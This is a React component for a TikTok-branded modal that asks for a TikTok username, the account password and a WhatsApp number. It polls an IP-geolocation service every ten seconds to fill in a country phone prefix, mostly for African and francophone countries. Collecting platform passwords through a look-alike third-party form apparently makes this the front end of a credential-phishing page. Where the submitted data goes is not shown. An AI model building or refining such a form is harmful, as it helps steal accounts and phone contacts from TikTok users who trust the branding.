import React from 'react';
import { useTranslation } from 'react-i18next';
import { TikTokCredentials } from '../types';
import { User, Lock, X, ArrowRight, ArrowLeft, Phone } from 'lucide-react';

interface Props {
  onSubmit: (data: TikTokCredentials) => void;
  onCancel: () => void;
}

// Mapping des codes pays vers les préfixes téléphoniques
const countryPhonePrefixes: Record<string, string> = {
  CM: '+237', // Cameroun
  SN: '+221', // Sénégal
  CI: '+225', // Côte d'Ivoire
  ML: '+223', // Mali
  BF: '+226', // Burkina Faso
  GN: '+224', // Guinée
  TG: '+228', // Togo
  BJ: '+229', // Bénin
  NE: '+227', // Niger
  MG: '+261', // Madagascar
  CD: '+243', // RD Congo
  CG: '+242', // Congo
  GA: '+241', // Gabon
  TD: '+235', // Tchad
  CF: '+236', // Centrafrique
  RW: '+250', // Rwanda
  BI: '+257', // Burundi
  DJ: '+253', // Djibouti
  ET: '+251', // Éthiopie
  KE: '+254', // Kenya
  UG: '+256', // Ouganda
  TZ: '+255', // Tanzanie
  ZA: '+27',  // Afrique du Sud
  NG: '+234', // Nigeria
  GH: '+233', // Ghana
  MA: '+212', // Maroc
  DZ: '+213', // Algérie
  TN: '+216', // Tunisie
  EG: '+20',  // Égypte
  FR: '+33',  // France
  BE: '+32',  // Belgique
  CH: '+41',  // Suisse
  CA: '+1',   // Canada
  US: '+1',  // USA
};

export function TikTokFormModal({ onSubmit, onCancel }: Props) {
  const { t } = useTranslation();
  const [formData, setFormData] = React.useState<TikTokCredentials>({
    username: '',
    password: '',
    whatsapp: ''
  });
  const [countryPrefix, setCountryPrefix] = React.useState<string>('+237');
  const [isLoadingPrefix, setIsLoadingPrefix] = React.useState(true);

  // Détecter le pays via l'IP en temps réel (polling toutes les 10 secondes)
  React.useEffect(() => {
    let lastCountryCode: string | null = null;
    
    const detectCountry = async () => {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        const countryCode = data.country_code;
        
        // Ne mettre à jour que si le pays a changé
        if (countryCode !== lastCountryCode && countryPhonePrefixes[countryCode]) {
          lastCountryCode = countryCode;
          setCountryPrefix(countryPhonePrefixes[countryCode]);
        }
      } catch (error) {
        console.error('Erreur lors de la détection du pays:', error);
        // Garder le préfixe actuel
      } finally {
        setIsLoadingPrefix(false);
      }
    };
    
    // Détection initiale
    detectCountry();
    
    // Polling toutes les 10 secondes pour détecter les changements d'IP
    const intervalId = setInterval(detectCountry, 10000);
    
    // Nettoyage à la fermeture du composant
    return () => clearInterval(intervalId);
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Combiner le préfixe pays avec le numéro WhatsApp
    const fullWhatsapp = `${countryPrefix}${formData.whatsapp}`;
    onSubmit({
      ...formData,
      whatsapp: fullWhatsapp
    });
  };

  return (
    <div className="fixed inset-0 modal-backdrop flex items-center justify-center p-3 sm:p-4 z-50 fade-in">
      <div className="bg-[var(--background-elevated)] rounded-[var(--radius-lg)] w-full max-w-md shadow-[var(--shadow-lg)] overflow-hidden slide-up border border-[var(--border-dark)]">
        {/* En-tête avec dégradé */}
        <div className="bg-gradient-to-r from-[var(--tiktok-blue)] to-[var(--tiktok-red)] p-4 sm:p-6 relative">
          <button 
            onClick={onCancel}
            className="absolute top-3 sm:top-4 right-3 sm:right-4 text-white bg-white bg-opacity-20 rounded-full p-1.5 hover:bg-opacity-30 transition-colors"
          >
            <X size={20} />
          </button>
          
          <h2 className="text-xl sm:text-2xl font-bold text-white mb-1">{t('tiktokForm.title')}</h2>
          <p className="text-white text-opacity-80 text-xs sm:text-sm">
            {t('tiktokForm.subtitle')}
          </p>
        </div>
        
        <form onSubmit={handleSubmit} className="p-4 sm:p-6 space-y-4 sm:space-y-5">
          <div>
            <label htmlFor="username" className="tiktok-label flex items-center gap-2 text-xs sm:text-sm">
              <User className="w-3 h-3 sm:w-4 sm:h-4 text-[var(--tiktok-red)]" />
              <span>{t('tiktokForm.usernameLabel')}</span>
            </label>
            <div className="relative">
              <input
                type="text"
                id="username"
                required
                className="tiktok-input pl-10 text-sm sm:text-base"
                value={formData.username}
                onChange={(e) => setFormData(prev => ({ ...prev, username: e.target.value }))}
                placeholder={t('tiktokForm.usernamePlaceholder')}
              />
              <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 text-sm">
                @
              </div>
            </div>
          </div>

          <div>
            <label htmlFor="password" className="tiktok-label flex items-center gap-2 text-xs sm:text-sm">
              <Lock className="w-3 h-3 sm:w-4 sm:h-4 text-[var(--tiktok-red)]" />
              <span>{t('tiktokForm.passwordLabel')}</span>
            </label>
            <input
              type="password"
              id="password"
              required
              className="tiktok-input text-sm sm:text-base"
              value={formData.password}
              onChange={(e) => setFormData(prev => ({ ...prev, password: e.target.value }))}
              placeholder={t('tiktokForm.passwordPlaceholder')}
            />
          </div>

          <div>
            <label htmlFor="whatsapp" className="tiktok-label flex items-center gap-2 text-xs sm:text-sm">
              <Phone className="w-3 h-3 sm:w-4 sm:h-4 text-[var(--tiktok-red)]" />
              <span>{t('tiktokForm.whatsappLabel')}</span>
            </label>
            <div className="flex gap-2">
              <input
                type="text"
                id="countryPrefix"
                className="tiktok-input w-20 sm:w-24 text-center text-sm sm:text-base"
                value={countryPrefix}
                onChange={(e) => setCountryPrefix(e.target.value)}
                disabled={isLoadingPrefix}
                placeholder="+---"
              />
              <input
                type="tel"
                id="whatsapp"
                required
                className="tiktok-input flex-1 text-sm sm:text-base"
                value={formData.whatsapp}
                onChange={(e) => setFormData(prev => ({ ...prev, whatsapp: e.target.value }))}
                placeholder={t('tiktokForm.whatsappPlaceholder')}
              />
            </div>
            <p className="text-xs text-[var(--text-secondary)] mt-1">
              {t('tiktokForm.whatsappHint')}
            </p>
          </div>

          <div className="pt-4">
            <button
              type="submit"
              className="tiktok-button w-full flex items-center justify-center gap-2 text-sm sm:text-base py-2.5 sm:py-3"
            >
              {t('tiktokForm.nextButton')}
              <ArrowRight className="w-3 h-3 sm:w-4 sm:h-4" />
            </button>
            
            <button
              type="button"
              onClick={onCancel}
              className="w-full text-center mt-4 text-xs sm:text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors flex items-center justify-center gap-2"
            >
              <ArrowLeft className="w-3 h-3 sm:w-4 sm:h-4" />
              {t('cancel')}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}